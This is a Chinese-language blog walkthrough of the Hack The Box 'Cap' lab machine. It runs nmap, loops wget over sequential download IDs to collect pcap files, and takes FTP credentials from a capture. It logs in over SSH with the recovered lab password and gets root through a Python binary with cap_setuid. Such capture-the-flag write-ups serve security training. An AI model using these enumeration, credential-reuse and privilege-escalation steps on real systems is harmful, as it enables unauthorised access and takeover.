<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>HTB_WP</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="Hack the box walkthrough


Cap扫描：

└─# nmap -sC -sV 10.10.10.245Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 23:01 EDTNmap scan report for 10.10.10.245Host is up (1.4s latency).Not shown: 997 closed tcp ports (reset)PORT   STATE SERVICE VERSION21&amp;#x2F;tcp open  ftp     vsftpd 3.0.322&amp;#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubunt.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">HTB_WP</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cap"><span class="toc-text">Cap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Not Found</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Bad Request</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Bad\x20Request</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Not\x20Found&lt;&#x2F;SF:h1&gt;\nThe\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20SF:server.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2SF:0check\x20your\x20spelling\x20and\x20try\x20again.\n”);Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HTB"><i class="tag post-item-tag">HTB</i></a><a href="/tags/WP"><i class="tag post-item-tag">WP</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">HTB_WP</h1><time class="has-text-grey" datetime="2024-08-29T06:41:39.000Z">2024-08-29</time><article class="mt-2 post-content"><p>Hack the box walkthrough</p>
<span id="more"></span>

<h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><p>扫描：</p>
<blockquote>
<p>└─# nmap -sC -sV 10.10.10.245<br>Starting Nmap 7.94SVN ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2024-08-28 23:01 EDT<br>Nmap scan report for 10.10.10.245<br>Host is up (1.4s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21&#x2F;tcp open  ftp     vsftpd 3.0.3<br>22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)<br>|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)<br>|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)<br>80&#x2F;tcp open  http    gunicorn<br>|_http-server-header: gunicorn<br>|<em>http-title: Security Dashboard<br>| fingerprint-strings:<br>|   FourOhFourRequest:<br>|     HTTP&#x2F;1.0 404 NOT FOUND<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:52:06 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Content-Length: 232<br>|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><br>|     <title>404 Not Found</title><br>|     <h1>Not Found</h1><br>|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p><br>|   GetRequest:<br>|     HTTP&#x2F;1.0 200 OK<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:51:51 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Content-Length: 19386<br>|     <!DOCTYPE html><br>|     <html class="no-js" lang="en"><br>|     <head><br>|     <meta charset="utf-8"><br>|     <meta http-equiv="x-ua-compatible" content="ie=edge"><br>|     <title>Security Dashboard</title><br>|     <meta name="viewport" content="width=device-width, initial-scale=1"><br>|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico"><br>|     <link rel="stylesheet" href="/static/css/bootstrap.min.css"><br>|     <link rel="stylesheet" href="/static/css/font-awesome.min.css"><br>|     <link rel="stylesheet" href="/static/css/themify-icons.css"><br>|     <link rel="stylesheet" href="/static/css/metisMenu.css"><br>|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css"><br>|     <link rel="stylesheet" href="/static/css/slicknav.min.css"><br>|     &lt;!– amchar<br>|   HTTPOptions:<br>|     HTTP&#x2F;1.0 200 OK<br>|     Server: gunicorn<br>|     Date: Thu, 29 Aug 2024 02:51:52 GMT<br>|     Connection: close<br>|     Content-Type: text&#x2F;html; charset&#x3D;utf-8<br>|     Allow: OPTIONS, GET, HEAD<br>|     Content-Length: 0<br>|   RTSPRequest:<br>|     HTTP&#x2F;1.1 400 Bad Request<br>|     Connection: close<br>|     Content-Type: text&#x2F;html<br>|     Content-Length: 196<br>|     <html><br>|     <head><br>|     <title>Bad Request</title><br>|     </head><br>|     <body><br>|     <h1><p>Bad Request</p></h1><br>|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP&#x2F;1.0&amp;#x27;&amp;#x27;<br>|     </body><br>|</em>    </html><br>1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at <a target="_blank" rel="noopener" href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port80-TCP:V&#x3D;7.94SVN%I&#x3D;7%D&#x3D;8&#x2F;28%Time&#x3D;66CFE491%P&#x3D;x86_64-pc-linux-gnu%r(G<br>SF:etRequest,1574,”HTTP&#x2F;1.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:<br>SF:x20Thu,\x2029\x20Aug\x202024\x2002:51:51\x20GMT\r\nConnection:\x20close<br>SF:\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20<br>SF:19386\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class&#x3D;&quot;no-js&quot;\x20lang&#x3D;&quot;en<br>SF:”&gt;\n\n<head>\n\x20\x20\x20\x20&lt;meta\x20charset&#x3D;&quot;utf-8&quot;&gt;\n\x20\x20\x20<br>SF:\x20&lt;meta\x20http-equiv&#x3D;&quot;x-ua-compatible&quot;\x20content&#x3D;&quot;ie&#x3D;edge&quot;&gt;\n\x<br>SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20&lt;me<br>SF:ta\x20name&#x3D;&quot;viewport&quot;\x20content&#x3D;&quot;width&#x3D;device-width,\x20initial-sca<br>SF:le&#x3D;1&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;shortcut\x20icon&quot;\x20type&#x3D;&quot;im<br>SF:age&#x2F;png&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;images&#x2F;icon&#x2F;favicon.ico&quot;&gt;\n\x20\x20\x20\x<br>SF:20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;bootstrap.min.css<br>SF:&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;<br>SF:font-awesome.min.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;<br>SF:x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;themify-icons.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20r<br>SF:el&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;metisMenu.css&quot;&gt;\n\x20\x20\x20<br>SF:\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;owl.carousel.mi<br>SF:n.css&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel&#x3D;&quot;stylesheet&quot;\x20href&#x3D;&quot;&#x2F;stati<br>SF:c&#x2F;css&#x2F;slicknav.min.css&quot;&gt;\n\x20\x20\x20\x20&lt;!–\x20amchar”)%r(HTTPOpt<br>SF:ions,B3,”HTTP&#x2F;1.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,<br>SF:\x2029\x20Aug\x202024\x2002:51:52\x20GMT\r\nConnection:\x20close\r\nCon<br>SF:tent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nAllow:\x20OPTIONS,\x20GET,<br>SF:\x20HEAD\r\nContent-Length:\x200\r\n\r\n”)%r(RTSPRequest,121,”HTTP&#x2F;1.1<br>SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t<br>SF:ext&#x2F;html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20<br>SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv<br>SF:alid\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;R<br>SF:TSP&#x2F;1.0&amp;#x27;&amp;#x27;\n\x20\x20</body>\n</html>\n”)%r(FourOhFourRequest,<br>SF:189,”HTTP&#x2F;1.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x<br>SF:20Thu,\x2029\x20Aug\x202024\x2002:52:06\x20GMT\r\nConnection:\x20close<br>SF:r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x202<br>SF:32\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20&quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD\x20HTML\x203.2<br>SF:x20Final&#x2F;&#x2F;EN&quot;&gt;\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found&lt;&#x2F;<br>SF:h1&gt;\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20<br>SF:server.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2<br>SF:0check\x20your\x20spelling\x20and\x20try\x20again.</p>\n”);<br>Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 266.91 seconds</p>
</blockquote>
<p>看一下web：</p>
<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829145204826.png" alt="image-20240829145204826"></p>
<p> 点击安全快照跳转到一个操作面板，可以下载pcap文件，剩下两个按钮可以查看网络状态，但是好像都没什么用</p>
<p>到处抓包试一下，发现下载按钮的id很明显：</p>
<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829145514553.png" alt="image-20240829145514553"></p>
<p>写个简单的脚本挨着下载一下</p>
<blockquote>
<p><strong>for</strong> i <strong>in</strong> <strong>{<strong>0..500</strong>}</strong>; <strong>do</strong>   wget 10.10.10.245&#x2F;download&#x2F;<strong>${<strong>i</strong>}</strong> -O pcaps&#x2F;<strong>${<strong>i</strong>}</strong>.pcap 2&gt;&#x2F;dev&#x2F;null <strong>||</strong> break;  <strong>done</strong>;</p>
</blockquote>
<p>先查看下载的<code>0.cap</code>,根据之前的端口扫描，开放了FTP端口，可以看一下FTP协议的报文是否有登录记录：</p>
<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829162841043.png" alt="image-20240829162841043"></p>
<p>正好有一个，跟踪一下这个tcp流：</p>
<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829162930597.png" alt="image-20240829162930597"></p>
<p>看到了账户密码，可以ftp连接也可以ssh连接，ssh正常连接没有成功，学习了一下发现可以这样<code>sshpass</code>：</p>
<blockquote>
<p>sshpass -p ‘Buck3tH4TF0RM3!’ ssh <a href="mailto:&#x6e;&#x61;&#116;&#104;&#x61;&#x6e;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x32;&#x34;&#53;">&#x6e;&#x61;&#116;&#104;&#x61;&#x6e;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x32;&#x34;&#53;</a></p>
</blockquote>
<p>登陆上去之后发现一个linux的提权脚本，(lll￢ω￢)</p>
<p>直接跑一下：</p>
<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240829161641874.png" alt="image-20240829161641874"></p>
<p>cap提权：</p>
<p>写一个python脚本然后用这个py3.8运行：</p>
<pre><code>import os
os.setuid(0)
os.system(&quot;/bin/bash&quot;)
</code></pre>
<p>或者直接：</p>
<pre><code>nathan@cap:/var/www/html$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import os
&gt;&gt;&gt; os.setuid(0)
&gt;&gt;&gt; pty.spawn(&quot;bash&quot;)
</code></pre>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/09/18/XCTF-easylaravel/" title="XCTF_easylaravel"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: XCTF_easylaravel</span></a><a class="button is-default" href="/2023/12/04/BUUCTF/" title="BUUCTF"><span class="has-text-weight-semibold">Next: BUUCTF</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>